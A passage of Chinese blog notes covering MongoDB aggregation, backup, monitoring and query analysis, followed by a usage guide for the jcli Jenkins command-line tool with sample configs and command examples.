<td>获取集合中所有文档对应值得最大值。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, num_tutorial : {$max : “$likes”}}}])</td>
</tr>
<tr>
<td>$push</td>
<td>在结果文档中插入值到一个数组中。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$push: “$url”}}}])</td>
</tr>
<tr>
<td>$addToSet</td>
<td>在结果文档中插入值到一个数组中，但不创建副本。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, url : {$addToSet : “$url”}}}])</td>
</tr>
<tr>
<td>$first</td>
<td>根据资源文档的排序获取第一个文档数据。</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, first_url : {$first : “$url”}}}])</td>
</tr>
<tr>
<td>$last</td>
<td>根据资源文档的排序获取最后一个文档数据</td>
<td>db.mycol.aggregate([{$group : {_id : “$by_user”, last_url : {$last : “$url”}}}])</td>
</tr>
</tbody>
</table>
<h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>管道在Unix和Linux中一般用于将当前命令的输出结果作为下一个命令的参数。MongoDB的聚合管道将MongoDB文档在一个管道处理完毕后将结果传递给下一个管道处理。管道操作是可以重复的。</p>
<p><strong>参数</strong></p>
<table>
<thead>
<tr>
<th>$project</th>
<th>修改输入文档的结构。可以用来重命名、增加或删除域，也可以用于创建计算结果以及嵌套文档。</th>
</tr>
</thead>
<tbody>
<tr>
<td>$match</td>
<td>用于过滤数据，只输出符合条件的文档。$match使用MongoDB的标准查询操作。</td>
</tr>
<tr>
<td>$limit</td>
<td>用来限制MongoDB聚合管道返回的文档数。</td>
</tr>
<tr>
<td>$skip</td>
<td>在聚合管道中跳过指定数量的文档，并返回余下的文档。</td>
</tr>
<tr>
<td>$unwind</td>
<td>将文档中的某一个数组类型字段拆分成多条，每条包含数组中的一个值。</td>
</tr>
<tr>
<td>$group</td>
<td>将集合中的文档分组，可用于统计结果。</td>
</tr>
<tr>
<td>$sortr</td>
<td>输出接近某一地理位置的有序文档。</td>
</tr>
</tbody>
</table>
<h2 id="备份-mongodump-与恢复-mongorestore"><a href="#备份-mongodump-与恢复-mongorestore" class="headerlink" title="备份(mongodump)与恢复(mongorestore)"></a>备份(mongodump)与恢复(mongorestore)</h2><h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><p>导出所有数据到指定目录中</p>
<p><code>mongodump -h dbhost -d dbname -o dbdirectory</code></p>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th>h</th>
<th>MongDB所在服务器地址，例如：127.0.0.1，当然也可以指定端口号：127.0.0.1:27017</th>
</tr>
</thead>
<tbody>
<tr>
<td>d</td>
<td>需要备份的数据库实例，例如：test</td>
</tr>
<tr>
<td>o</td>
<td>备份的数据存放位置，例如：c:\data\dump，当然该目录需要提前建立，在备份完成后，系统自动在dump目录下建立一个test目录，这个目录里面存放该数据库实例的备份数据。</td>
</tr>
</tbody>
</table>
<h3 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a>数据恢复</h3><p><code>mongorestore -h &lt;hostname&gt;&lt;:port&gt; -d dbname &lt;path&gt;</code></p>
<p><strong>参数：</strong></p>
<table>
<thead>
<tr>
<th>–host &lt;:port&gt;, -h &lt;:port&gt;</th>
<th>MongoDB所在服务器地址，默认为： localhost:27017</th>
</tr>
</thead>
<tbody>
<tr>
<td>–db , -d</td>
<td>需要恢复的数据库实例，例如：test，当然这个名称也可以和备份时候的不一样，比如test2</td>
</tr>
<tr>
<td>–drop</td>
<td>恢复的时候，先删除当前数据，然后恢复备份的数据。就是说，恢复后，备份后添加修改的数据都会被删除，慎用哦！</td>
</tr>
<tr>
<td><path></path></td>
<td>mongorestore 最后的一个参数，设置备份数据所在位置，例如：c:\data\dump\test。你不能同时指定 <path> 和 –dir 选项，–dir也可以设置备份目录。</path></td>
</tr>
<tr>
<td>–dir</td>
<td>指定备份的目录。你不能同时指定 <path> 和 –dir 选项</path></td>
</tr>
</tbody>
</table>
<h2 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h2><h3 id="mongostat-命令"><a href="#mongostat-命令" class="headerlink" title="mongostat 命令"></a>mongostat 命令</h3><p>它会间隔固定时间获取mongodb的当前运行状态，并输出。</p>
<h3 id="mongotop-命令"><a href="#mongotop-命令" class="headerlink" title="mongotop 命令"></a>mongotop 命令</h3><p>用来跟踪一个MongoDB的实例，查看哪些大量的时间花费在读取和写入数据。mongotop提供每个集合的水平的统计数据。默认情况下，mongotop返回值的每一秒。</p>
<p><code>mongotop &lt;sleeptime&gt;</code></p>
<p><strong>参数：</strong></p>
<p>等待的时间长度，以秒为单位，mongotop等待调用之间。通过的默认mongotop返回数据的每一秒。</p>
<p><strong><code>mongotop --locks</code></strong></p>
<p><strong>返回参数说明</strong></p>
<table>
<thead>
<tr>
<th>ns</th>
<th>包含数据库命名空间，后者结合了数据库名称和集合。</th>
</tr>
</thead>
<tbody>
<tr>
<td>db</td>
<td>包含数据库的名称。名为 . 的数据库针对全局锁定，而非特定数据库。</td>
</tr>
<tr>
<td>total</td>
<td>mongod花费的时间工作在这个命名空间提供总额。</td>
</tr>
<tr>
<td>read</td>
<td>提供了大量的时间，这mongod花费在执行读操作，在此命名空间。</td>
</tr>
<tr>
<td>write</td>
<td>提供这个命名空间进行写操作，这mongod花了大量的时间。</td>
</tr>
</tbody>
</table>
<h2 id="查询分析"><a href="#查询分析" class="headerlink" title="查询分析"></a>查询分析</h2><p>可以确保我们建议的索引是否有效，是查询语句性能分析的重要工具。</p>
<h3 id="explain"><a href="#explain" class="headerlink" title="explain()"></a>explain()</h3><p>提供了查询信息，使用索引及查询统计等。</p>
<p>创建 gender 和 user_name 的索引：<br><code>db.users.ensureIndex({gender:1,user_name:1})</code><br>现在在查询语句中使用 explain ：<br><code>&gt;db.users.find({gender:&quot;M&quot;},{user_name:1,_id:0}).explain()</code></p>
<p><strong>返回结果参数说明</strong></p>
<table>
<thead>
<tr>
<th>indexOnly</th>
<th>字段为 true ，表示我们使用了索引。</th>
</tr>
</thead>
<tbody>
<tr>
<td>cursor</td>
<td>因为这个查询使用了索引，MongoDB 中索引存储在B树结构中，所以这是也使用了 BtreeCursor 类型的游标。如果没有使用索引，游标的类型是 BasicCursor。这个键还会给出你所使用的索引的名称，你通过这个名称可以查看当前数据库下的system.indexes集合（系统自动创建，由于存储索引信息，这个稍微会提到）来得到索引的详细信息。</td>
</tr>
<tr>
<td>n</td>
<td>当前查询返回的文档数量。</td>
</tr>
<tr>
<td>nscanned/nscannedObjects</td>
<td>表明当前这次查询一共扫描了集合中多少个文档，我们的目的是，让这个数值和返回文档的数量越接近越好。</td>
</tr>
<tr>
<td>millis</td>
<td>当前查询所需时间，毫秒数。</td>
</tr>
<tr>
<td>indexBounds</td>
<td>当前查询具体使用的索引。</td>
</tr>
</tbody>
</table>
<h3 id="hint"><a href="#hint" class="headerlink" title="hint()"></a>hint()</h3><p>使用 hint 来强制 MongoDB 使用一个指定的索引。</p>
<p>指定了使用 gender 和 user_name 索引字段来查询：<br><code>&gt;db.users.find({gender:&quot;M&quot;},{user_name:1,_id:0}).hint({gender:1,user_name:1})</code><br>可以使用 explain() 函数来分析以上查询：<br><code>&gt;db.users.find({gender:&quot;M&quot;},{user_name:1,_id:0}).hint({gender:1,user_name:1}).explain()</code></p>
<h2 id="原子操作常用命令"><a href="#原子操作常用命令" class="headerlink" title="原子操作常用命令"></a>原子操作常用命令</h2><table>
<thead>
<tr>
<th>$set</th>
<th>用来指定一个键并更新键值，若键不存在并创建。</th>
<th>{ $set : { field : value } }</th>
</tr>
</thead>
<tbody>
<tr>
<td>$unset</td>
<td>用来删除一个键。</td>
<td>{ $unset : { field : 1} }</td>
</tr>
<tr>
<td>$inc</td>
<td>$inc可以对文档的某个值为数字型（只能为满足要求的数字）的键进行增减的操作。</td>
<td>{ $inc : { field : value } }</td>
</tr>
<tr>
<td>$push</td>
<td>把value追加到field里面去，field一定要是数组类型才行，如果field不存在，会新增一个数组类型加进去。</td>
<td>{ $push : { field : value } }</td>
</tr>
<tr>
<td>$pushAll</td>
<td>同$push,只是一次可以追加多个值到一个数组字段内。</td>
<td>{ $pushAll : { field : value_array } }</td>
</tr>
<tr>
<td>$pull</td>
<td>从数组field内删除一个等于value值。</td>
<td>{ $pull : { field : _value } }</td>
</tr>
<tr>
<td>$pop</td>
<td>删除数组的第一个或最后一个元素</td>
<td>{ $pop : { field : 1 } }</td>
</tr>
<tr>
<td>$rename</td>
<td>修改字段名称</td>
<td>{ $rename : { old_field_name : new_field_name } }</td>
</tr>
<tr>
<td>$bit</td>
<td>位操作，integer类型</td>
<td>{$bit : { field : {and : 5}}}</td>
</tr>
<tr>
<td>$addToSet</td>
<td>增加一个值到数组内，而且只有当这个值不在数组内才增加。</td>
<td></td>
</tr>
<tr>
<td></td>
<td>偏移操作符</td>
<td>t.find() { “_id” : ObjectId(“4b97e62bf1d8c7152c9ccb74”), “title” : “ABC”, “comments” : [ { “by” : “joe”, “votes” : 3 }, { “by” : “jane”, “votes” : 7 } ] }</td>
</tr>
</tbody>
</table>
<h2 id="MongoDB-Java"><a href="#MongoDB-Java" class="headerlink" title="MongoDB Java"></a>MongoDB Java</h2><p>下载mongo jar包，下载地址：<a href="http://mongodb.github.io/mongo-java-driver/" target="_blank" rel="noopener">http://mongodb.github.io/mongo-java-driver/</a>, 请确保下载最新版本。</p>
<p><a href="http://mongodb.github.io/mongo-java-driver/3.0/driver/getting-started/quick-tour/" target="_blank" rel="noopener">http://mongodb.github.io/mongo-java-driver/3.0/driver/getting-started/quick-tour/</a></p>
]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>jenkins-jcli</title>
    <url>/jenkins-jcli/</url>
    <content><![CDATA[<h3 id="jcli-笔记"><a href="#jcli-笔记" class="headerlink" title="jcli 笔记"></a>jcli 笔记</h3><h4 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h4><p>易于维护的 jcli 配置文件<br>支持管理多个 Jenkins<br>插件管理（列表、搜索、安装、上传）<br>任务管理（搜索、构建、日志）<br>在浏览器中打开 Jenkins<br>重启 Jenkins<br>支持连接代理</p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>你可以从 <a href="https://github.com/jenkins-zh/jenkins-cli" target="_blank" rel="noopener">jenkins-cli</a> 的代码仓库中克隆 jcli（Go语言开发）。目前，我们支持三个主流的操作 系统平台： MacOS、Linux、和 Windows。<br><a id="more"></a><br>MacOS<br>你可以使用 brew 安装 jcli。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">brew tap jenkins-zh/jcli</span><br><span class="line">brew install jcli</span><br><span class="line">Linux</span><br></pre></td></tr></table></figure>
<p>在 Linux 下安装也是非常的简单。你只需要执行下面的命令即可：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/jenkins-zh/jenkins-cli/releases/latest/download/jcli-linux-amd64.tar.gz|tar xzv</span><br><span class="line">sudo mv jcli /usr/local/bin/</span><br></pre></td></tr></table></figure></p>
<p>Windows<br>你可以点击<a href="https://github.com/jenkins-zh/jenkins-cli/releases/latest/download/jcli-windows-386.tar.gz" target="_blank" rel="noopener">下载链接</a>到最新的版本。 然后，下载 tar 文件，把解压后的 jcli 拷贝到系统目录下。</p>
<h4 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h4><p>你安装好 jcli 后，可以通过下面的命令生成一个配置样本：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ jcli config generate</span><br><span class="line">current: yourServer</span><br><span class="line">jenkins_servers:</span><br><span class="line">- name: yourServer</span><br><span class="line">  url: http://localhost:8080/jenkins</span><br><span class="line">  username: admin</span><br><span class="line">  token: 111e3a2f0231198855dceaff96f20540a9</span><br><span class="line">  proxy: &quot;&quot;</span><br><span class="line">  proxyAuth: &quot;&quot;</span><br><span class="line"># Goto &apos;http://localhost:8080/jenkins/me/configure&apos;, then you can generate your token.</span><br></pre></td></tr></table></figure></p>
<p>在大多数情况下，你应该只需要修改三个字段，包括：url、username 和 token。好的，我相信你已经准备好了。 然后，就可以通过下面的命令来检查你的 Jenkins 中是否安装了 github 插件：</p>
<p><code>jcli plugin list --filter name=github</code></p>
<p>下面是详细命令说明。</p>
<h4 id="command"><a href="#command" class="headerlink" title="command"></a>command</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jcli [Command] [Flags]        # 文档中 [command] 为必须含有命令，[flags] 为参数</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  config                                                  配置相关</span><br><span class="line">  center                                                  管理和更新中心</span><br><span class="line">  completion  Genereate bash completion scripts           ？？？？？？？</span><br><span class="line">  config      Manage the config of jcli                   配置管理jcli的配置</span><br><span class="line">  crumb       Print crumbIssuer of Jenkins                停止job</span><br><span class="line">  doc         Generate document for all jcl commands      生成说明文档</span><br><span class="line">  help        Help about any command                      帮助</span><br><span class="line">  job         Print the job of your Jenkins               job 管理</span><br><span class="line">  open        Open your Jenkins with a browse             应该就是浏览器打开，没用</span><br><span class="line">  plugin      Manage the plugins of Jenkins               管理插件</span><br><span class="line">  queue       Manage the queue of your Jenkins            管理队列</span><br><span class="line">  restart     Restart your Jenkins                        重启</span><br><span class="line">  user        Print the user of your Jenkins              用户管理</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Global Flags:</span><br><span class="line">      --configFile string   备用配置文件</span><br><span class="line">      --debug               将输出打印到 debug.html</span><br><span class="line">  -j, --jenkins string      选择要控制的 jenkins 服务器</span><br><span class="line">  -v, --version             打印 Jenkins CLI</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">全局可用参数：</span><br><span class="line">[root@VM_89_116_centos ~]# jcli -j ex2</span><br><span class="line">Jenkins CLI (jcli) manage your Jenkins</span><br><span class="line">Current Jenkins is: ex2</span><br><span class="line"></span><br><span class="line">[root@VM_89_116_centos ~]# jcli -v</span><br><span class="line">Jenkins CLI (jcli) manage your Jenkins</span><br><span class="line">Version: v0.0.22</span><br><span class="line">Commit: eade6aa</span><br></pre></td></tr></table></figure>
<h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">命令参数说明：</span><br><span class="line"></span><br><span class="line"># jcli config [command][Flags]</span><br><span class="line"></span><br><span class="line">  add         添加一个配置项</span><br><span class="line">  edit        修改一个配置项</span><br><span class="line">  generate    生成一个配置文件做参考</span><br><span class="line">  list        列出所有的配置项</span><br><span class="line">  remove      移除一个配置项</span><br><span class="line">  select      选择一个配置项</span><br></pre></td></tr></table></figure>
<h5 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_89_116_centos ~]# jcli config generate</span><br><span class="line"></span><br><span class="line">生成的默认配置文件：</span><br><span class="line"></span><br><span class="line">current: yourServer</span><br><span class="line">language: &quot;&quot;</span><br><span class="line">jenkins_servers:</span><br><span class="line">- name: yourServer</span><br><span class="line">  url: http://localhost:8080/jenkins</span><br><span class="line">  username: admin</span><br><span class="line">  token: 111e3a2f0231198855dceaff96f20540a9</span><br><span class="line">  proxy: &quot;&quot;</span><br><span class="line">  proxyAuth: &quot;&quot;</span><br><span class="line">  description: &quot;&quot;</span><br><span class="line">preHooks: []</span><br><span class="line">postHooks: []</span><br><span class="line">pluginSuites: []</span><br><span class="line"></span><br><span class="line"># Language context is accept-language for HTTP header, It contains zh-CN/zh-TW/en/en-US/ja and so on</span><br><span class="line"># Goto &apos;http://localhost:8080/jenkins/me/configure&apos;, then you can generate your token.</span><br><span class="line"></span><br><span class="line">#语言上下文是 HTTP 头的接受语言，它包含 zh-CN/zh-TW/en/en-US/ja 等</span><br><span class="line">#转到“http://localhost:8080/jenkins/me/configure”，然后可以生成令牌。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">配置文件参数说明：</span><br><span class="line">username：你生成密匙时所登录的用户名</span><br><span class="line">proxy: 代理</span><br><span class="line">proxyAuth: &quot;&quot;</span><br><span class="line">description: &quot;&quot;</span><br><span class="line">preHooks: []</span><br><span class="line">postHooks: []</span><br><span class="line">pluginSuites: []</span><br></pre></td></tr></table></figure>
<h5 id="add"><a href="#add" class="headerlink" title="add"></a>add</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli config add [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -d, --description string   Description of the Jenkins</span><br><span class="line">  -h, --help                 help for add</span><br><span class="line">  -n, --name string          Name of the Jenkins</span><br><span class="line">  -p, --proxy string         Proxy of the Jenkins</span><br><span class="line">  -a, --proxyAuth string     ProxyAuth of the Jenkins</span><br><span class="line">  -t, --token string         Token of the Jenkins</span><br><span class="line">      --url string           URL of the Jenkins</span><br><span class="line">  -u, --username string      UserName of the Jenkins</span><br><span class="line"></span><br><span class="line">example：</span><br><span class="line">增加配置两种方式：</span><br><span class="line">[root@VM_89_116_centos ~]# jcli config add -n ex1 -t 11ae42858f43b1d28335067efa4aaf6ada -u admin --url=http://localhost:8080</span><br><span class="line">[root@VM_89_116_centos ~]# jcli config add -n ex2</span><br><span class="line">新建 ex2 文件后，通过文件编辑器对 edit 修改文件。</span><br><span class="line"></span><br><span class="line">在大多数情况下，只需要注意四个字段，包括：name、url、username 和 token。</span><br><span class="line"></span><br><span class="line">[root@VM_89_116_centos ~]# jcli config edit</span><br><span class="line">current: yourServer</span><br><span class="line">language: &quot;&quot;</span><br><span class="line">jenkins_servers:</span><br><span class="line">- name: yourServer</span><br><span class="line">  url: http://localhost:8080</span><br><span class="line">  username: admin</span><br><span class="line">  token: 11d61409b3a23c5a5a340eb0423b5121b4</span><br><span class="line">  proxy: &quot;&quot;</span><br><span class="line">  proxyAuth: &quot;&quot;</span><br><span class="line">  description: &quot;&quot;</span><br><span class="line">- name: ex1</span><br><span class="line">  url: http://localhost:8080</span><br><span class="line">  username: admin</span><br><span class="line">  token: 11ae42858f43b1d28335067efa4aaf6ada</span><br><span class="line">  proxy: &quot;&quot;</span><br><span class="line">  proxyAuth: &quot;&quot;</span><br><span class="line">  description: &quot;&quot;</span><br><span class="line">preHooks: []</span><br><span class="line">postHooks: []</span><br><span class="line">pluginSuites: []</span><br></pre></td></tr></table></figure>
<h5 id="list"><a href="#list" class="headerlink" title="list"></a>list</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@VM_89_116_centos ~]# jcli config list</span><br><span class="line"></span><br><span class="line">number name        url                       description</span><br><span class="line">0      *yourServer http://localhost:8080</span><br><span class="line">1      ex1         http://localhost:8080</span><br></pre></td></tr></table></figure>
<h5 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h5><p><code>[root@VM_89_116_centos ~]# jcli config edit ex1</code></p>
<h5 id="select"><a href="#select" class="headerlink" title="select"></a>select</h5><p><code>[root@VM_89_116_centos ~]# jcli config select ex1</code></p>
<h5 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli config remove [flags]</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli config remove ex1</span><br></pre></td></tr></table></figure>
<h4 id="center"><a href="#center" class="headerlink" title="center"></a>center</h4><p>控制 jenkins 的下载更新</p>
<h5 id="upgrade"><a href="#upgrade" class="headerlink" title="upgrade"></a>upgrade</h5><p>Upgrade your Jenkins</p>
<p><code>[root@VM_89_116_centos ~]# jcli center upgrade</code></p>
<h5 id="download"><a href="#download" class="headerlink" title="download"></a>download</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli center download [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help            help for download</span><br><span class="line">      --lts             If you want to download Jenkins as LTS (default true)</span><br><span class="line">  -o, --output string   The file of output (default &quot;jenkins.war&quot;)</span><br><span class="line">      --progress        If you want to show the download progress (default true)</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli center download</span><br><span class="line">[root@VM_89_116_centos ~]# jcli center download -o ex4.war --progress=false</span><br><span class="line">重命名为ex4.war，progress 默认为 true，显示下载进度条。</span><br></pre></td></tr></table></figure>
<h5 id="watch"><a href="#watch" class="headerlink" title="watch"></a>watch</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Watch your update center status</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli center watch [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --count int               Count of watch (default 9999)</span><br><span class="line">                                计数（默认9999）</span><br><span class="line">  -i, --interval int            Interval of watch (default 1)</span><br><span class="line">                                间隔（默认值1）</span><br><span class="line">      --util-install-complete   The watch will be continue util all Jenkins plugins installation is completed </span><br><span class="line">                                监视将继续直到所有 Jenkins 插件安装完成</span><br><span class="line">      --util-need-restart       The watch will be continue util Jenkins needs restart</span><br><span class="line">                                启动监视将继续直到 Jenkins 需要重新启动</span><br><span class="line"></span><br><span class="line">watch 的参数可调，调节监控间隔时间、触发条件，通常用不到。</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli center watch</span><br><span class="line">Jenkins Version: 2.190.2</span><br></pre></td></tr></table></figure>
<h4 id="completion"><a href="#completion" class="headerlink" title="completion"></a>completion</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Genereate bash completion scripts</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli completion </span><br><span class="line"></span><br><span class="line">Examples:</span><br><span class="line"># Installing bash completion on macOS using homebrew</span><br><span class="line">        ## If running Bash 3.2 included with macOS</span><br><span class="line">        brew install bash-completion</span><br><span class="line">        ## or, if running Bash 4.1+</span><br><span class="line">        brew install bash-completion@2</span><br><span class="line">        ## you may need add the completion to your completion directory</span><br><span class="line">        jcli completion &gt; $(brew --prefix)/etc/bash_completion.d/jcli</span><br><span class="line">        ## If you get trouble, please visit https://github.com/jenkins-zh/jenkins-cli/issues/83.</span><br><span class="line"></span><br><span class="line">[root@VM_89_116_centos ~]# jcli completion &gt; $(brew --prefix)/etc/bash_completion.d/jcli</span><br></pre></td></tr></table></figure>
<h4 id="crumb"><a href="#crumb" class="headerlink" title="crumb"></a>crumb</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print crumbIssuer of Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli crumb </span><br><span class="line"></span><br><span class="line">example：</span><br><span class="line">  [root@VM_89_116_centos ~]# jcli crumb</span><br><span class="line">  Jenkins-Crumb=9775c2ca9bcbac492dcb16ca2509d5b7f89bae378553d1d761865c42ec3a924c</span><br></pre></td></tr></table></figure>
<h4 id="job"><a href="#job" class="headerlink" title="job"></a>job</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print the job of your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job [flags]</span><br><span class="line">  jcli job [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  artifact    Print the artifact list of target job：   显示出目标 job 的所有制品</span><br><span class="line">  build       Build the job of your Jenkins：           构建job</span><br><span class="line">  create      Create a job in your Jenkins：            创造job</span><br><span class="line">  delete      Delete a job in your Jenkins              删除job</span><br><span class="line">  edit        Edit the job of your Jenkins              修改一个job</span><br><span class="line">  history     Print the history of job in your Jenkins  显示出 job 历史记录</span><br><span class="line">  input       Input a job in your Jenkins               输入一个 job</span><br><span class="line">  log         Print the job of your Jenkins             打印 job 日志</span><br><span class="line">  param       Get param of the job of your Jenkins      获取 job 的参数</span><br><span class="line">  search      Print the job of your Jenkins             查询 job</span><br><span class="line">  stop        Stop a job build in your Jenkins          停止 job</span><br><span class="line">  type        Print the types of job which in your Jenkins   打印出 job 的类型</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -h, --help            help for job</span><br><span class="line">  -o, --output string   Format the output (default &quot;json&quot;)</span><br></pre></td></tr></table></figure>
<h5 id="artifact-（？）"><a href="#artifact-（？）" class="headerlink" title="artifact （？）"></a>artifact （？）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Print the artifact list of target job</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job artifact &lt;jobName&gt; [buildID] [flags]</span><br><span class="line">  jcli job artifact [command]</span><br><span class="line"></span><br><span class="line">Available Commands:</span><br><span class="line">  download    Download the artifact of target job</span><br><span class="line">Flags:</span><br><span class="line">  -h, --help</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Usage:</span><br><span class="line">  jcli job artifact download &lt;jobName&gt; [buildID] [flags]</span><br><span class="line"></span><br><span class="line">Download the artifact of target job</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --download-dir string   The directory which artifact will be downloaded</span><br><span class="line">  -h, --help                  help for download</span><br><span class="line">  -i, --id string             ID of the job artifact</span><br><span class="line">      --progress              Whether show the progress (default true)</span><br></pre></td></tr></table></figure>
<h5 id="build"><a href="#build" class="headerlink" title="build"></a>build</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Build the job of your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job build &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch          Batch mode, no need confirm   批处理模式，无需确认</span><br><span class="line">  -h, --help           help for build</span><br><span class="line">      --param string   Params of the job             作业参数</span><br><span class="line">      --verbose        Output the verbose            详细输出</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job build devops_ci_cd_pipline_ex1 -b --verbose</span><br></pre></td></tr></table></figure>
<h5 id="create"><a href="#create" class="headerlink" title="create"></a>create</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Create a job in your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job create &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --copy string   Copy an exists job</span><br><span class="line">  -h, --help          help for create</span><br><span class="line">      --type string   Which type do you want to create</span><br><span class="line"></span><br><span class="line">type:</span><br><span class="line">    Folder</span><br><span class="line">    GitHub Organization</span><br><span class="line">    Multibranch Pipeline</span><br><span class="line">    Freestyle project</span><br><span class="line">    Maven project</span><br><span class="line">    Multi-configuration project</span><br><span class="line">    Pipeline</span><br><span class="line">    External Job</span><br><span class="line">    MultiJob Project</span><br><span class="line"></span><br><span class="line">example: </span><br><span class="line">通过复制已有任务来创建新任务</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job create ex4 --copy devops_ci_cd_pipline_ex1</span><br><span class="line">创建新任务</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job create ex5</span><br></pre></td></tr></table></figure>
<h5 id="edit-1"><a href="#edit-1" class="headerlink" title="edit"></a>edit</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Edit the job of your Jenkins </span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job edit &lt;jobName&gt; </span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job edit devops_pipeline</span><br><span class="line"></span><br><span class="line">安装 pipeline-restful-api 插件然后重启</span><br></pre></td></tr></table></figure>
<h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Delete a job in your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job delete &lt;jobName&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch   Batch mode, no need confirm   不用询问确认是否创建</span><br><span class="line">  -h, --help    help for delete</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">[root@VM_89_116_centos ~]# jcli job delete ex5 -b</span><br></pre></td></tr></table></figure>
<h5 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Stop a job build in your Jenkins</span><br><span class="line">似乎有 bug ，要触发两次才能生效。</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job stop &lt;jobName&gt; &lt;buildNumber&gt; [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">  -b, --batch   Batch mode, no need confirm          批处理模式，无需确认</span><br><span class="line">  -h, --help    help for stop</span><br><span class="line"></span><br><span class="line">example:</span><br><span class="line">    jcli job stop devops_ci_cd_pipline_ex1 37 -b</span><br></pre></td></tr></table></figure>
<h5 id="input（？）"><a href="#input（？）" class="headerlink" title="input（？）"></a>input（？）</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input a job in your Jenkins</span><br><span class="line"></span><br><span class="line">Usage:</span><br><span class="line">  jcli job input &lt;jobName&gt; [buildID] [flags]</span><br><span class="line"></span><br><span class="line">Flags:</span><br><span class="line">      --action string   The action wether you want to process or abort.  </span><br><span class="line">                        活动处理或者终止</span><br><span class="line">  -h, --help            help for input</span><br></pre></td></tr></table></figure>
